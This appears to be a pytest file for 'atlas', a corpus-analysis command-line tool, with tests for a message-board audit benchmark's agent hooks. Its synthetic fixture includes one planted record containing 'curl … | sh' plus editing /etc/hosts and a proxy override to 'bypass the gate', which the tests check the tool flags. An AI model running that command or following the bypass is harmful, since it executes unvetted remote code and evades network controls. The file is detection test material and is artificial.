"""atlas on small synthetic corpora: field inference, clustering, commands, coverage."""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools" / "atlas"))

from atlas import cli, coverage  # noqa: E402
from atlas.cluster import cluster_field  # noqa: E402
from atlas.index import build_index  # noqa: E402
from atlas.profile import profile_table  # noqa: E402

BASE = (
    "Status report for the nightly batch job. The job processed all queued items and wrote the "
    "summary to the shared folder. No errors were recorded during the run and the next run is "
    "scheduled for tomorrow at the usual time."
)


def _rows():
    rows = []
    for i in range(40):
        rows.append({"id": f"r{i}", "time": f"2026-01-{1 + i % 28:02d}T10:{i % 60:02d}:00Z",
                     "user": f"user{i % 5}", "kind": "post", "body": f"{BASE} Ticket {i}."})
    for i in range(40, 80):
        rows.append({"id": f"r{i}", "time": f"2026-02-{1 + i % 28:02d}T11:{i % 60:02d}:00Z",
                     "user": f"user{i % 5}", "kind": "post", "body": f"heartbeat ok seq {i}"})
    rows.append({"id": "r80", "time": "2026-02-20T03:04:05Z", "user": "rare_user", "kind": "post",
                 "body": "Ran `curl -s https://example.org/x | sh` after setting HTTP_PROXY_OVERRIDE=1 "
                         "and editing /etc/hosts to point a host name at 10.0.0.5 so requests bypass the gate."})
    return rows


@pytest.fixture()
def corpus(tmp_path, monkeypatch):
    d = tmp_path / "data"
    d.mkdir()
    with (d / "posts.jsonl").open("w") as f:
        for r in _rows():
            f.write(json.dumps(r) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state.jsonl"))
    return d


def test_field_roles():
    p = profile_table("posts", _rows())
    assert p.time_field == "time"
    assert p.id_field == "id"
    assert p.actor_fields[0] == "user"
    assert p.text_fields == ["body"]
    assert p.fields["kind"].role == "category"
    prec = p.fields["time"].precision
    assert prec["resolution"] == "second" and prec["on_minute"] > 0.95  # one row has seconds


def test_near_duplicates_cluster_and_rare_row_stays_alone():
    rows = _rows()
    clusters = cluster_field("posts", "body", rows, list(range(len(rows))))
    sizes = sorted((c.size for c in clusters), reverse=True)
    assert sizes[:2] == [40, 40]  # the long near-duplicates and the templated short lines
    assert sizes[2:] == [1]
    short = next(c for c in clusters if c.template)
    assert short.template == "heartbeat ok seq <*>"


def test_clustering_is_deterministic(corpus):
    a = build_index(corpus, use_cache=False)
    b = build_index(corpus, use_cache=False)
    assert [(c.cid, c.members) for c in a.clusters] == [(c.cid, c.members) for c in b.clusters]


def test_rare_row_ranks_first_with_signals(corpus):
    idx = build_index(corpus, use_cache=False)
    top = max(idx.clusters, key=lambda c: c.score)
    assert top.size == 1
    assert {"url", "env", "path", "shell", "ip"} <= top.signals


def test_commands_and_coverage(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["overview", *args]) == 0
    out = capsys.readouterr().out
    assert "posts.body" in out and "→ next:" in out
    idx = build_index(corpus)
    rare = max(idx.clusters, key=lambda c: c.score).cid
    assert cli.main(["unseen", *args]) == 0
    assert rare in capsys.readouterr().out
    assert cli.main(["expand", rare, *args]) == 0
    assert "/etc/hosts" in capsys.readouterr().out
    opened, rows, _listed = coverage.load()
    assert rare in opened and "posts:81" in rows
    assert cli.main(["unseen", *args]) == 0
    assert f" {rare} " not in capsys.readouterr().out
    assert cli.main(["grep", "-i", "BYPASS", *args]) == 0
    assert "posts:81" in capsys.readouterr().out
    assert cli.main(["show", "posts:81", *args]) == 0
    assert "rare_user" in capsys.readouterr().out


def test_options_before_the_command(corpus, capsys):
    assert cli.main(["--data", str(corpus), "overview"]) == 0
    assert "posts.body" in capsys.readouterr().out


def test_bad_input_explains_itself(corpus, capsys):
    assert cli.main(["expand", "c999", "--data", str(corpus)]) == 0
    assert "unknown id" in capsys.readouterr().out
    assert cli.main(["grep", "(", "--data", str(corpus)]) == 0
    assert "bad regex" in capsys.readouterr().out
    assert cli.main([]) == 0
    assert "atlas overview" in capsys.readouterr().out


def test_show_by_record_id_and_ids_in_output(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["show", "r80", *args]) == 0
    out = capsys.readouterr().out
    assert out.startswith("posts:81 (id=r80)") and "rare_user" in out


def test_profile_shows_an_example_record(corpus, capsys):
    assert cli.main(["profile", "--data", str(corpus)]) == 0
    assert "example: [posts:" in capsys.readouterr().out


def test_entities_extracts_hosts_ips_paths_and_env(corpus, capsys):
    idx = build_index(corpus, use_cache=False)
    kinds = {k for k, _ in idx.entities}
    assert {"host", "ip", "path", "posts.user"} <= kinds
    assert ("host", "example.org") in idx.entities and ("ip", "10.0.0.5") in idx.entities
    assert ("env", "HTTP_PROXY_OVERRIDE") in idx.entities
    assert not any(k == "host" and v.endswith((".md", ".py")) for k, v in idx.entities)
    assert cli.main(["entities", "--data", str(corpus)]) == 0
    assert "example.org" in capsys.readouterr().out


def test_pivot_builds_a_timeline_across_fields(corpus, capsys):
    assert cli.main(["pivot", "rare_user", "--data", str(corpus)]) == 0
    out = capsys.readouterr().out
    assert "pivot 'rare_user': 1 rows" in out and "posts:81 (id=r80)" in out


def test_count_with_where_and_by(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["count", "posts.user", "--where", "kind=post", "--where", "user!=rare_user", *args]) == 0
    out = capsys.readouterr().out
    assert "80 of 81 rows" in out and "user0" in out
    assert cli.main(["count", "posts.user", "--by", "month", *args]) == 0
    assert "2026-02" in capsys.readouterr().out
    assert cli.main(["count", "posts.user", "--where", "bad", *args]) == 0
    assert "bad --where" in capsys.readouterr().out


def test_unseen_reports_coverage_of_top_salient(corpus, capsys):
    assert cli.main(["unseen", "--data", str(corpus)]) == 0
    assert "most salient rare records: shown" in capsys.readouterr().out


def _themed_corpus(tmp_path, monkeypatch):
    """Many differently worded posts about two activities, plus one isolated oddity."""
    import random

    rng = random.Random(0)
    filler = "alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike".split()
    rows = []
    for i in range(240):
        topic = ["backup", "restore", "snapshot", "volume"] if i % 2 else ["invoice", "payment", "refund", "ledger"]
        words = rng.sample(filler, 6) + rng.sample(topic, 3) + [f"w{i}x{j}" for j in range(4)]
        rng.shuffle(words)
        rows.append({"time": f"2026-03-{1 + i % 28:02d}T08:{i % 60:02d}:00Z", "user": f"u{i % 40}",
                     "body": " ".join(words) + f" note number {i} for the team"})
    rows.append({"time": "2026-03-15T03:00:00Z", "user": "zz", "body": "zebra quokka narwhal axolotl " * 3})
    d = tmp_path / "themed"
    d.mkdir()
    with (d / "notes.jsonl").open("w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache2"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state2.jsonl"))
    return d


def test_themes_find_topics_and_rare_records_say_whether_isolated(tmp_path, monkeypatch, capsys):
    d = _themed_corpus(tmp_path, monkeypatch)
    idx = build_index(d, use_cache=False)
    seeds = {w for th in idx.themes for w in th.words}
    assert {"backup", "invoice"} & seeds or {"restore", "payment"} & seeds
    assert all(th.actors > 1 for th in idx.themes)
    assert cli.main(["overview", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "Themes: what is typical" in out
    odd = next(c for c in idx.clusters if "zebra" in idx.text_of(c, c.leader))
    assert odd.cid not in idx.cluster_themes
    assert cli.main(["expand", idx.themes[0].tid, "--data", str(d)]) == 0
    assert "example records" in capsys.readouterr().out


def test_grep_is_smart_case_and_entities_kind_accepts_bare_field(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["grep", "bypass the gate", *args]) == 0
    assert "posts:81" in capsys.readouterr().out
    assert cli.main(["grep", "BYPASS", *args]) == 0
    assert "no matches" in capsys.readouterr().out
    assert cli.main(["entities", "--kind", "user", *args]) == 0
    assert "rare_user" in capsys.readouterr().out


def test_unseen_moves_already_listed_records_down(tmp_path, monkeypatch, capsys):
    d = _themed_corpus(tmp_path, monkeypatch)
    args = ["--data", str(d)]
    assert cli.main(["unseen", *args]) == 0
    first = capsys.readouterr().out
    assert cli.main(["unseen", *args]) == 0
    second = capsys.readouterr().out
    ids = lambda out: re.findall(r"^ +(c\d+) ×", out, re.M)  # noqa: E731
    assert ids(first) and ids(second)
    assert ids(second)[0] not in ids(first)  # new material first on the second call
    assert "shown in earlier lists but not opened" in second


def test_show_accepts_cluster_and_theme_ids(corpus, capsys):
    idx = build_index(corpus, use_cache=False)
    rare = max(idx.clusters, key=lambda c: c.score)
    assert cli.main(["show", rare.cid, "--data", str(corpus)]) == 0
    out = capsys.readouterr().out
    assert out.startswith("posts:81") and f"first record of {rare.cid}" in out


def test_rows_filters_sorts_and_selects_fields(corpus, capsys):
    args = ["--data", str(corpus)]
    assert cli.main(["rows", "posts", "--where", "user=rare_user", "--fields", "user,kind", *args]) == 0
    out = capsys.readouterr().out
    assert "posts where user=rare_user: 1 rows" in out and "posts:81 (id=r80)" in out and "kind=post" in out
    assert cli.main(["rows", "posts", "--where", "body~heartbeat", "--sort", "time", "--desc", *args]) == 0
    assert "40 rows" in capsys.readouterr().out
    assert cli.main(["rows", "posts", "--fields", "nope", *args]) == 0
    assert "unknown field" in capsys.readouterr().out


def test_join_reports_overlap_between_fields(tmp_path, monkeypatch, capsys):
    d = tmp_path / "j"
    d.mkdir()
    (d / "a.jsonl").write_text("".join(json.dumps({"page": p}) + "\n" for p in ["x", "y", "y", "z"]))
    (d / "b.jsonl").write_text("".join(json.dumps({"name": p}) + "\n" for p in ["Y", "z", "w"]))
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "c"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "s.jsonl"))
    assert cli.main(["join", "a.page", "b.name", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "a.page: 3 distinct values; 1 also in b.name (1/4 rows matched)" in out
    assert cli.main(["join", "a.page", "b.name", "-i", "--data", str(d)]) == 0
    assert "2 also in b.name (3/4 rows matched)" in capsys.readouterr().out


def test_policy_aware_continue_hook():
    import asyncio
    from types import SimpleNamespace

    from messageboard_audit_bench.native import policy_aware_continue

    now = [1000]
    hook = policy_aware_continue(1450, clock=lambda: now[0])
    no_tools = SimpleNamespace(output=SimpleNamespace(message=SimpleNamespace(tool_calls=[])))
    with_tools = SimpleNamespace(output=SimpleNamespace(message=SimpleNamespace(tool_calls=["x"])))
    early = asyncio.run(hook(no_tools))
    assert isinstance(early, str) and "450 seconds" in early and "submit" not in early.lower()
    assert asyncio.run(hook(with_tools)) is True
    now[0] = 1500
    assert asyncio.run(hook(no_tools)) is True  # Inspect's default nudge after the earliest finish


def test_policy_aware_continue_option_is_recorded_and_restricted():
    from messageboard_audit_bench.task import _german_wiki_report

    s = _german_wiki_report(agent="react", policy_aware_continue=True, time_limit_minutes=10).dataset[0]
    assert s.metadata["policy_aware_continue"] is True
    plain = _german_wiki_report(agent="react", time_limit_minutes=10).dataset[0]
    assert "policy_aware_continue" not in plain.metadata
    with pytest.raises(ValueError):
        _german_wiki_report(agent="codex", policy_aware_continue=True)


def test_where_supports_numeric_and_ordered_text_comparisons(corpus, capsys):
    from atlas.query import _parse_where

    keep = _parse_where(["n>=2", "n<10", "t>2026-06-18"])
    assert keep({"n": 5, "t": "2026-06-19T00:00:00Z"})
    assert not keep({"n": 10, "t": "2026-06-19T00:00:00Z"})
    assert not keep({"n": 5, "t": "2026-06-17T23:59:59Z"})
    assert not keep({"t": "2026-06-19T00:00:00Z"})  # missing value never matches
    assert _parse_where(["n>9"])({"n": "10"})  # numeric, not "10" < "9" as text
    args = ["--data", str(corpus)]
    assert cli.main(["rows", "posts", "--where", "time>=2026-02-20", "--where", "user!=rare_user", *args]) == 0
    out = capsys.readouterr().out
    assert "14 rows" in out and "posts:81" not in out  # the rare_user row is excluded
    assert cli.main(["count", "posts.user", "--where", "time<2026-01-05", *args]) == 0
    assert "of 81 rows" in capsys.readouterr().out


def _gap(corpus, report_text, tmp_path, *extra):
    rp = tmp_path / "report.md"
    rp.write_text(report_text)
    return cli.main(["gapcheck", str(rp), "--json", "--data", str(corpus), *extra])


def test_gapcheck_fix_items_are_exact(corpus, tmp_path, capsys):
    report = (
        "# Report\n\n"
        'The odd post says "editing /etc/hosts to point a host name at 10.0.0.5" (posts:81).\n\n'
        'Misattributed: "editing /etc/hosts to point a host name at 10.0.0.5" (posts:5).\n\n'
        "A ref that does not exist: posts:999.\n\n"
        'Invented: "the operator ordered every agent to stop at once" (posts:3).\n\n'
        'Fine with typography: “Status report for the nightly batch job… wrote the summary” (posts:1).\n\n'
        'Term list, not a quote: "alpha, bravo, charlie, delta" (posts:2).\n'
    )
    assert _gap(corpus, report, tmp_path) == 0
    out = json.loads(capsys.readouterr().out)
    fixes = [i["text"] for i in out["fix"]]
    assert any("posts:999 does not exist" in t for t in fixes)
    assert any("not in the cited posts:5" in t and "posts:81" in t for t in fixes)
    assert any("the operator ordered" in t and "not found verbatim" in t for t in fixes)
    assert not any("Status report" in t or "alpha, bravo" in t for t in fixes)
    assert not any('posts:81).' in t for t in fixes)  # the correctly cited quote is not flagged
    assert len(fixes) == 3


def test_gapcheck_ambiguous_cases_are_consider_not_fix(corpus, tmp_path, capsys):
    report = (
        "# Report\n\n"
        '"heartbeat ok seq" lines repeat; one says "heartbeat ok seq 41" and is cited as posts:2.\n\n'
        'A paraphrase: "Ran curl after setting HTTP_PROXY_OVERRIDE and editing /etc/hosts" (posts:81).\n\n'
        'Scare quotes without a citation: "the team clearly panicked about the gate".\n\n'
        "It happened on 2025-01-01.\n"
    )
    assert _gap(corpus, report, tmp_path) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["fix"] == []
    kinds = {i["key"].split("|")[0] for i in out["consider"]}
    assert "dates" in kinds and ({"near", "shortq"} & kinds)


def test_gapcheck_dismiss_hides_an_item(corpus, tmp_path, capsys):
    report = "# Report\n\nIt happened on 2025-01-01.\n"
    assert _gap(corpus, report, tmp_path) == 0
    item = next(i for i in json.loads(capsys.readouterr().out)["consider"] if i["key"].startswith("dates"))
    assert cli.main(["gapcheck", "--dismiss", item["gid"], "--data", str(corpus)]) == 0
    capsys.readouterr()
    assert _gap(corpus, report, tmp_path) == 0
    assert item["gid"] not in {i["gid"] for i in json.loads(capsys.readouterr().out)["consider"]}


def test_timeline_finds_start_end_and_peaks(corpus, capsys):
    assert cli.main(["timeline", "--data", str(corpus)]) == 0
    out = capsys.readouterr().out
    assert "first activity 2026-01-01" in out and "last activity" in out


def test_combined_continue_runs_gapcheck_once_after_threshold():
    import asyncio
    from types import SimpleNamespace

    from messageboard_audit_bench.native import combined_continue

    now = [100]
    calls = []

    async def runner():
        calls.append(now[0])
        if now[0] < 120:
            return None, {"error": "no report found"}  # no draft yet: try again later
        return "Automatic check … 1 to fix, 2 to consider", {"fix": 1, "consider": 2}

    record: dict = {}
    hook = combined_continue(None, 110, record, runner=runner, clock=lambda: now[0])
    tools = SimpleNamespace(output=SimpleNamespace(message=SimpleNamespace(tool_calls=["x"])))
    assert asyncio.run(hook(tools)) is True and calls == []  # before the threshold
    now[0] = 115
    assert asyncio.run(hook(tools)) is True and calls == [115]  # no draft yet
    now[0] = 125
    assert asyncio.run(hook(tools)).startswith("Automatic check")
    assert record["done"] and record["fix"] == 1 and record["attempts"] == 2
    now[0] = 130
    assert asyncio.run(hook(tools)) is True and len(calls) == 2  # only once


def test_gapcheck_at_option_validation_and_prompt():
    from messageboard_audit_bench.task import _german_wiki_report

    s = _german_wiki_report(agent="react", tools="atlas", gapcheck_at=0.6, time_limit_minutes=10).dataset[0]
    assert s.metadata["gapcheck_at"] == 0.6 and "atlas gapcheck" in s.input
    with pytest.raises(ValueError):
        _german_wiki_report(agent="react", gapcheck_at=0.6)  # needs tools=atlas
    with pytest.raises(ValueError):
        _german_wiki_report(agent="react", tools="atlas", gapcheck_at=1.5)


def test_ledger_writer_option_keeps_control_prompt_unchanged():
    from messageboard_audit_bench.task import _german_wiki_report

    control = _german_wiki_report(agent="react", tools="atlas", time_limit_minutes=10).dataset[0]
    treatment = _german_wiki_report(
        agent="react", tools="atlas", ledger_writer=True, time_limit_minutes=10
    ).dataset[0]
    assert treatment.input.startswith(control.input)
    assert "evidence_ledger.md" in treatment.input
    assert treatment.metadata["ledger_writer_enabled"] is True
    with pytest.raises(ValueError, match="ledger_writer needs"):
        _german_wiki_report(agent="react", ledger_writer=True)


def test_ledger_writer_uses_only_draft_and_ledger():
    from messageboard_audit_bench.ledger_writer import WriterInput, writer_messages

    messages = writer_messages(WriterInput("Draft text", "Claim supported by log:12", 2500, 3000))
    text = "\n".join(str(message.content) for message in messages)
    assert "Draft text" in text and "log:12" in text
    assert "2500 to 3000" in text
    assert "human report" not in text.lower()


def test_anomalies_find_lookalikes_mixed_scripts_and_bursts(tmp_path, monkeypatch, capsys):
    lookalike = "admin_k\u0430rl"  # Cyrillic а (U+0430) in place of the Latin a
    rows = [{"id": f"a{i}", "time": f"2026-01-{1 + i % 20:02d}T10:00:00Z", "user": "admin_karl",
             "body": f"routine maintenance note number {i} for the wiki"} for i in range(60)]
    rows += [{"id": f"b{i}", "time": "2026-01-15T11:00:00Z", "user": lookalike,
              "body": f"edit made under a borrowed name {i}"} for i in range(3)]
    rows.append({"id": "b9", "time": "2026-01-15T11:00:00Z", "user": "visitor",
                 "body": f"signed as {lookalike} in the text"})
    rows += [{"id": f"c{i}", "time": "2026-01-16T09:00:00Z", "user": "bot7", "body": f"automated ping {i}"}
             for i in range(30)]  # a burst: one actor, one day
    rows += [{"id": f"d{day}", "time": f"2026-01-{day:02d}T09:00:00Z", "user": "bot7", "body": "hello"}
             for day in (2, 3, 4)]
    d = tmp_path / "data"
    d.mkdir()
    with (d / "posts.jsonl").open("w") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state.jsonl"))
    assert cli.main(["anomalies", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "'admin_karl' (posts.user" in out and f"look-alike '{lookalike}'" in out
    assert "U+0430 CYRILLIC SMALL LETTER A" in out
    assert "looks like 'admin_karl'" in out  # the mixed-script word in the text
    assert "posts.user=bot7: 30 rows" in out and "2026-01-16" in out.split("posts.user=bot7")[1][:80]
    from atlas.anomalies import skeleton

    assert skeleton("Fri\u0435drich") == skeleton("friedrich") and skeleton("M\u00fcller") != skeleton("Muller")


def test_time_unit_adapts_to_the_corpus_span_and_gapcheck_matches_times(tmp_path, monkeypatch, capsys):
    """A corpus spanning hours is read in sub-day buckets: peaks and changes are found, and
    the gap checker matches times of day in the report, not just the (single) date."""
    rows = []
    for m in range(0, 240, 2):  # 4 hours of quiet activity, one row every 2 minutes
        rows.append({"id": f"q{m}", "time": f"2026-03-05T{8 + m // 60:02d}:{m % 60:02d}:00Z", "user": "u1",
                     "body": f"routine step {m}"})
    for k in range(60):  # a surge between 10:00 and 10:20
        rows.append({"id": f"s{k}", "time": f"2026-03-05T10:{k // 3:02d}:{(k * 7) % 60:02d}Z", "user": "u2",
                     "body": f"surge item {k}"})
    d = tmp_path / "data"
    d.mkdir()
    with (d / "log.jsonl").open("w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")
    monkeypatch.setenv("ATLAS_CACHE", str(tmp_path / "cache"))
    monkeypatch.setenv("ATLAS_STATE", str(tmp_path / "state.jsonl"))
    from atlas.timeline import time_unit

    assert time_unit(build_index(d)).name == "minute" or time_unit(build_index(d)).name == "10 minutes"
    assert cli.main(["timeline", "--data", str(d)]) == 0
    out = capsys.readouterr().out
    assert "counted per" in out and "peak at 2026-03-05 10:" in out
    report = tmp_path / "report.md"
    report.write_text("# Report\n\nOn 2026-03-05 the log shows routine steps (log:1).\n")
    assert cli.main(["gapcheck", str(report), "--data", str(d)]) == 0
    assert "peak at 2026-03-05 10:" in capsys.readouterr().out  # the date alone does not cover it
    report.write_text("# Report\n\nOn 2026-03-05 the log shows routine steps (log:1), then a surge at 10:05 "
                      "(log:130).\n")
    assert cli.main(["gapcheck", str(report), "--data", str(d)]) == 0
    assert "peak at 2026-03-05 10:" not in capsys.readouterr().out
